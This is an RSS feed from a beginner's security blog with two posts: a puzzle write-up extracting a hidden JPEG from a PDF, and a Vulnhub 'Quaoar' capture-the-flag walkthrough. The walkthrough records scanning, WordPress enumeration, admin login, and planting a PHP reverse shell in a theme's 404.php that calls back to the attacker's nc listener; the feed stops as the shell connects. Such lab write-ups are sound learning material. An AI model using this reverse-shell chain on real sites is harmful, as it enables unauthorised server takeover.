<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Root Network Security</title>
    <description>Beginners's journey through the world of security, programming and system administration. In love with GNU/Linux and cryptography.</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
    
      <item>
        <title>Gynvael Polish Mission 010</title>
        <description>&lt;p&gt;Let's get back to work, and as Gynvael started streaming again, his mission should be great start. &lt;/p&gt;

&lt;pre&gt;
MISSION 010            goo.gl/oAdvWe                  DIFFICULTY: ███░░░░░░░ [3/10]
┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅

We've received PDF document, where apparently there's a hidden message.
Would you help us find it?

  https://goo.gl/wgt94W

Good luck!
&lt;/pre&gt;

&lt;p&gt;I started this challenge by looking at the file with a hex editor. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/gynvael-missions/pdf_hex_editor.png&quot; alt=&quot;Hexdump&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After a few moments of searching, I've found the &lt;b&gt;JFIF&lt;/b&gt; segment and so, the whole structure of &lt;b&gt;JPG&lt;/b&gt; file. From that moment, I think we'll be able to extract it from the PDF and somehow recreate it. &lt;/p&gt;

&lt;p&gt;Quick peek at &lt;a href=&quot;https://en.wikipedia.org/wiki/JPEG_File_Interchange_Format&quot;&gt;Wikipedia&lt;/a&gt; showed that whole JPG file is placed between &lt;code&gt;FF DA&lt;/code&gt; and &lt;code&gt;FF D9&lt;/code&gt; codes. &lt;/p&gt;

&lt;table&gt;&lt;tr&gt;
&lt;th colspan=&quot;3&quot; style=&quot;text-align:left&quot;&gt;JFIF file structure&lt;/th&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;th style=&quot;text-align:left&quot;&gt;Segment&lt;/th&gt;
&lt;th style=&quot;text-align:left&quot;&gt;Code&lt;/th&gt;
&lt;th style=&quot;text-align:left&quot;&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;SOI&lt;/td&gt;
&lt;td&gt;&lt;code&gt;FF D8&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;Start of Image&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;JFIF-APP0&lt;/td&gt;
&lt;td&gt;&lt;code&gt;FF E0 &lt;i&gt;s1&lt;/i&gt; &lt;i&gt;s2&lt;/i&gt; 4A 46 49 46 00 ...&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;see below&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;JFXX-APP0&lt;/td&gt;
&lt;td&gt;&lt;code&gt;FF E0 &lt;i&gt;s1&lt;/i&gt; &lt;i&gt;s2&lt;/i&gt; 4A 46 58 58 00 ...&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;optional, see below&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td colspan=&quot;3&quot;&gt;… additional marker segments&lt;br /&gt;
(for example SOF, DHT, COM)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;SOS&lt;/td&gt;
&lt;td&gt;&lt;code&gt;FF DA&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;Start of Scan&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;compressed image data&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;EOI&lt;/td&gt;
&lt;td&gt;&lt;code&gt;FF D9&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;End of Image&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;

&lt;p&gt;Now let's copy everything between these segments and add to a new file. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/gynvael-missions/hex_image.png&quot; alt=&quot;hex image&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Last step is to save this file as JPG image. By the way, here's the flag ;)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/gynvael-missions/pdf_flag.jpg&quot; alt=&quot;flag&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Sun, 10 Sep 2017 08:00:00 +0000</pubDate>
        <link>http://localhost:4000/gynveal-mission-10-polish/</link>
        <guid isPermaLink="true">http://localhost:4000/gynveal-mission-10-polish/</guid>
      </item>
    
      <item>
        <title>Vulnhub.com - Quaoar</title>
        <description>&lt;p&gt;Hello everyone, another week, another challenge from &lt;a href=&quot;https://www.vulnhub.com/&quot;&gt;&lt;b&gt;Vulnhub&lt;/b&gt;&lt;/a&gt;. This time we're going to work on a short machine called &lt;b&gt;Quaoar&lt;/b&gt;. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Welcome to Quaoar

This is a vulnerable machine i created for the Hackfest 2016 CTF http://hackfest.ca/

Difficulty : Very Easy

Tips:

Here are the tools you can research to help you to own this machine. nmap dirb / dirbuster / BurpSmartBuster nikto wpscan hydra Your Brain Coffee Google :)

Goals: This machine is intended to be doable by someone who is interested in learning computer security There are 3 flags on this machine 1. Get a shell 2. Get root access 3. There is a post exploitation flag on the box

Feedback: This is my first vulnerable machine, please give me feedback on how to improve ! @ViperBlackSkull on Twitter simon.nolet@hotmail.com Special Thanks to madmantm for testing

SHA-256 DA39EC5E9A82B33BA2C0CD2B1F5E8831E75759C51B3A136D3CB5D8126E2A4753

You may have issues with VMware&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Author: &lt;a href=&quot;https://www.vulnhub.com/author/viper,475/&quot;&gt;&lt;b&gt;Viper&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Download: &lt;a href=&quot;https://www.vulnhub.com/entry/hackfest2016-quaoar,180/&quot;&gt;&lt;b&gt;Quaoar&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h1&gt;Write-Up&lt;/h1&gt;

&lt;p&gt;Attacker: &lt;b&gt;Kali Linux 192.168.56.103&lt;/b&gt;&lt;/p&gt;
&lt;p&gt;Victim: &lt;b&gt;Quaoar 192.168.56.102&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;Let's start by firstly scanning the machine with &lt;b&gt;nmap&lt;/b&gt;. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; 192.168.56.102

Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-08-19 08:24 EDT
NSE: Loaded 132 scripts &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;scanning.
NSE: Script Pre-scanning.
Initiating NSE at 08:24
Completed NSE at 08:24, 0.00s elapsed
Initiating NSE at 08:24
Completed NSE at 08:24, 0.00s elapsed
Initiating ARP Ping Scan at 08:24
Scanning 192.168.56.102 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1 port]
Completed ARP Ping Scan at 08:24, 0.22s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using &lt;span class=&quot;nt&quot;&gt;--system-dns&lt;/span&gt; or specify valid servers with &lt;span class=&quot;nt&quot;&gt;--dns-servers&lt;/span&gt;
Initiating SYN Stealth Scan at 08:24
Scanning 192.168.56.102 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1000 ports]
Discovered open port 80/tcp on 192.168.56.102
Discovered open port 995/tcp on 192.168.56.102
Discovered open port 110/tcp on 192.168.56.102
Discovered open port 22/tcp on 192.168.56.102
Discovered open port 993/tcp on 192.168.56.102
Discovered open port 53/tcp on 192.168.56.102
Discovered open port 139/tcp on 192.168.56.102
Discovered open port 445/tcp on 192.168.56.102
Discovered open port 143/tcp on 192.168.56.102
Completed SYN Stealth Scan at 08:24, 1.43s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1000 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Initiating Service scan at 08:24
Scanning 9 services on 192.168.56.102
Completed Service scan at 08:24, 11.02s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;9 services on 1 host&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Initiating OS detection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;try &lt;span class=&quot;c&quot;&gt;#1) against 192.168.56.102&lt;/span&gt;
adjust_timeouts2: packet supposedly had rtt of &lt;span class=&quot;nt&quot;&gt;-176545&lt;/span&gt; microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of &lt;span class=&quot;nt&quot;&gt;-176545&lt;/span&gt; microseconds.  Ignoring time.
NSE: Script scanning 192.168.56.102.
Initiating NSE at 08:24
Completed NSE at 08:24, 9.19s elapsed
Initiating NSE at 08:24
Completed NSE at 08:24, 0.00s elapsed
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.102
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00082s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 991 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey:
|   1024 d0:0a:61:d5:d0:3a:38:c2:67:c3:c3:42:8f:ae:ab:e5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   2048 bc:e0:3b:ef:97:99:9a:8b:9e:96:cf:02:cd:f1:5e:dc &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 8c:73:46:83:98:8f:0d:f7:f5:c8:e4:58:68:0f:80:75 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
53/tcp  open  domain      ISC BIND 9.8.1-P1
| dns-nsid:
|_  bind.version: 9.8.1-P1
80/tcp  open  http        Apache httpd 2.2.22 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
| http-methods:
|_  Supported Methods: POST OPTIONS GET HEAD
| http-robots.txt: 1 disallowed entry
|_Hackers
|_http-server-header: Apache/2.2.22 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html).
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: RESP-CODES STLS PIPELINING SASL TOP UIDL CAPA
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Issuer: commonName=ubuntu/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2016-10-07T04:32:43
| Not valid after:  2026-10-07T04:32:43
| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
|_ssl-date: 2017-08-19T14:24:32+00:00; +2h00m00s from scanner time.
139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: IDLE SASL-IR ENABLE more STARTTLS ID have capabilities LOGIN-REFERRALS post-login LOGINDISABLEDA0001 listed LITERAL+ OK IMAP4rev1 Pre-login
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Issuer: commonName=ubuntu/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2016-10-07T04:32:43
| Not valid after:  2026-10-07T04:32:43
| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
|_ssl-date: 2017-08-19T14:24:31+00:00; +2h00m00s from scanner time.
445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
993/tcp open  ssl/imap    Dovecot imapd
|_imap-capabilities: IDLE SASL-IR AUTH=PLAINA0001 more ID have capabilities LOGIN-REFERRALS post-login listed LITERAL+ OK IMAP4rev1 ENABLE Pre-login
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Issuer: commonName=ubuntu/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2016-10-07T04:32:43
| Not valid after:  2026-10-07T04:32:43
| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
|_ssl-date: 2017-08-19T14:24:31+00:00; +1h59m59s from scanner time.
995/tcp open  ssl/pop3    Dovecot pop3d
|_pop3-capabilities: RESP-CODES PIPELINING USER SASL(PLAIN) TOP UIDL CAPA
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Issuer: commonName=ubuntu/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2016-10-07T04:32:43
| Not valid after:  2026-10-07T04:32:43
| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
|_ssl-date: 2017-08-19T14:24:31+00:00; +1h59m59s from scanner time.
MAC Address: 08:00:27:BB:CE:22 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.5
Uptime guess: 198.049 days (since Thu Feb  2 06:14:13 2017)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: QUAOAR, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
| Names:
|   QUAOAR&amp;lt;00&amp;gt;           Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
|   QUAOAR&amp;lt;03&amp;gt;           Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
|   QUAOAR&amp;lt;20&amp;gt;           Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
|   \x01\x02__MSBROWSE__\x02&amp;lt;01&amp;gt;  Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
|   WORKGROUP&amp;lt;1d&amp;gt;        Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
|   WORKGROUP&amp;lt;1e&amp;gt;        Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
|_  WORKGROUP&amp;lt;00&amp;gt;        Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
| smb-os-discovery:
|   OS: Unix (Samba 3.6.3)
|   NetBIOS computer name:
|   Workgroup: WORKGROUP
|_  System time: 2017-08-19T10:24:30-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server doesn'&lt;/span&gt;t support SMBv2 protocol

TRACEROUTE
HOP RTT     ADDRESS
1   0.82 ms 192.168.56.102

NSE: Script Post-scanning.
Initiating NSE at 08:24
Completed NSE at 08:24, 0.00s elapsed
Initiating NSE at 08:24
Completed NSE at 08:24, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;25.33 seconds
           Raw packets sent: 1127 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;51.988KB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 1122 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;47.336KB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Wow, that's a lot of open ports. I decided to begin from looking at the &lt;b&gt;port 80&lt;/b&gt;. In addition &lt;b&gt;nmap&lt;/b&gt; scan showed disallowed entry, which we have to check out. &lt;/p&gt;

&lt;p&gt;Main directory of the web pages showes only two images. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/quaoar/htp1.png&quot; alt=&quot;Hack_The_Planet_1&quot; class=&quot;img-responsive center-block&quot; /&gt;
&lt;br /&gt;
&lt;img src=&quot;/img/quaoar/htp2.png&quot; alt=&quot;Hack_The_Planet_2&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now let's take a look at &lt;b&gt;robots.txt&lt;/b&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Disallow: Hackers
Allow: /wordpress/
   ____                              
&lt;span class=&quot;c&quot;&gt;#  /___ \_   _  __ _  ___   __ _ _ __&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# //  / / | | |/ _` |/ _ \ / _` | '__|&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#/ \_/ /| |_| | (_| | (_) | (_| | |   &lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#\___,_\ \__,_|\__,_|\___/ \__,_|_|   &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Wordpress directory? Seems interesting. By looking at the source code, we know that it's an old version of this CMS. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;generator&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;WordPress 3.9.14&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Let's run a &lt;b&gt;wpscan&lt;/b&gt;, while in meantime I decided to look for common usernames on the &lt;b&gt;wp-login&lt;/b&gt; page. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# wpscan &lt;span class=&quot;nt&quot;&gt;--url&lt;/span&gt; http://192.168.56.102/wordpress
_______________________________________________________________
        __          _______   _____                  
        &lt;span class=&quot;se&quot;&gt;\ \ &lt;/span&gt;       / /  __ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/ ____|                 
         &lt;span class=&quot;se&quot;&gt;\ \ &lt;/span&gt; /&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; / /| |__&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;___   ___  __ _ _ __  
          &lt;span class=&quot;se&quot;&gt;\ \/&lt;/span&gt;  &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt; / |  ___/ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/ __|/ _ | _ &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
           &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; /&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; /  | |     ____&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;__| &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_| | | | |
            &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;  &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;   |_|    |_____/ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] URL: http://192.168.56.102/wordpress/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Started: Sat Aug 19 08:30:02 2017

&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; The WordPress &lt;span class=&quot;s1&quot;&gt;'http://192.168.56.102/wordpress/readme.html'&lt;/span&gt; file exists exposing a version number
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Interesting header: SERVER: Apache/2.2.22 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Interesting header: X-POWERED-BY: PHP/5.3.10-1ubuntu3
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] XML-RPC Interface available under: http://192.168.56.102/wordpress/xmlrpc.php
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Upload directory has directory listing enabled: http://192.168.56.102/wordpress/wp-content/uploads/

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] WordPress version 3.9.14 identified from meta generator

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] WordPress theme &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;use: twentyfourteen - v1.1

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Name: twentyfourteen - v1.1
 |  Location: http://192.168.56.102/wordpress/wp-content/themes/twentyfourteen/
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; The version is out of date, the latest version is 1.6
 |  Style URL: http://192.168.56.102/wordpress/wp-content/themes/twentyfourteen/style.css
 |  Referenced style.css: wp-content/themes/twentyfourteen/style.css
 |  Theme Name: Twenty Fourteen
 |  Theme URI: http://wordpress.org/themes/twentyfourteen
 |  Description: In 2014, our default theme lets you create a responsive magazine website with a sleek, modern des...
 |  Author: the WordPress team
 |  Author URI: http://wordpress.org/

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Enumerating plugins from passive detection ...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] No plugins found

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Finished: Sat Aug 19 08:30:05 2017
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Requests Done: 41
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Memory used: 8.387 MB
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Elapsed &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 00:00:03&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But wait, there's an &lt;b&gt;admin&lt;/b&gt; account? &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/quaoar/wp-admin.png&quot; alt=&quot;Admin login&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And there's even more, username of this account is simply &lt;b&gt;admin&lt;/b&gt;! Now we're in the administrator panel of Wordpress, from where we can deploy a &lt;a href=&quot;http://pentestmonkey.net/tools/web-shells/php-reverse-shell&quot;&gt;PHP Reverse Shell&lt;/a&gt;. &lt;/p&gt;

&lt;p&gt;Reemeber to change the IP address. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$VERSION&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;1.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'192.168.56.103'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// CHANGE THIS
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1234&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;// CHANGE THIS
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$chunk_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$write_a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$error_a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$shell&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'uname -a; w; id; /bin/sh -i'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$daemon&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$debug&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;To put it in the site, I decided to modify the code of &lt;b&gt;404.php&lt;/b&gt; page from the theme. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/quaoar/wp-shell.png&quot; alt=&quot;Shell&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then, we only have to set up the listener and navigate to the url of the page. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;192.168.56.102/wordpress/wp-content/themes/twentyfourteen/404.php&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 1234
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 1234 ...
192.168.56.102: inverse host lookup failed: Unknown host
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.56.103] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.56.102] 51795
